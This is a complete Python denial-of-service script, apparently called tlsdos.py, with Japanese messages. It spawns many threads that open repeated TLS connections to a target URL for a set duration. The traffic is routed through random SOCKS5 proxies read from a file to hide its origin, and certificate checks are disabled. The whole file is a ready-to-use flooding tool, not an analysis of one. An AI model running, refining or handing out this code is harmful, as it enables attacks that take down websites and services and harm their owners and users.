import sys
import threading
import time
import ssl
import socket
import socks
import random
from urllib.parse import urlparse
import logging

def load_proxies():
    with open("proxies.txt", "r") as file:
        proxies = [line.strip() for line in file if line.strip()]
    return proxies

def get_random_proxy(proxies):
    if proxies:
        return random.choice(proxies)
    return None

def create_tls_connection(target, duration, proxy):
    parsed_url = urlparse(target)
    host = parsed_url.netloc
    port = parsed_url.port if parsed_url.port else 443

    if proxy:
        proxy_host, proxy_port = proxy.split(":")
        socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, proxy_host, int(proxy_port))
        socket.socket = socks.socksocket

    context = ssl.create_default_context()
    context.check_hostname = False
    context.verify_mode = ssl.CERT_NONE

    end_time = time.time() + duration
    while time.time() < end_time:
        try:
            with socket.create_connection((host, port)) as sock:
                with context.wrap_socket(sock, server_hostname=host) as ssock:
                    print(f"{proxy_host} → {host}")
        except Exception as e:
            with open('error_log.txt', 'a') as file:
                file.write(f"接続エラー: {e}\n")

def start_attack(target, duration, threads, proxies):
    for _ in range(threads):
        proxy = get_random_proxy(proxies)
        threading.Thread(target=create_tls_connection, args=(target, duration, proxy)).start()

if __name__ == "__main__":
    if len(sys.argv) != 4:
        print("使用法: python tlsdos.py target_url attack_duration threads_count")
        sys.exit(1)

    target_url = sys.argv[1]
    attack_duration = int(sys.argv[2])
    threads_count = int(sys.argv[3])
    proxies = load_proxies()

    start_attack(target_url, attack_duration, threads_count, proxies)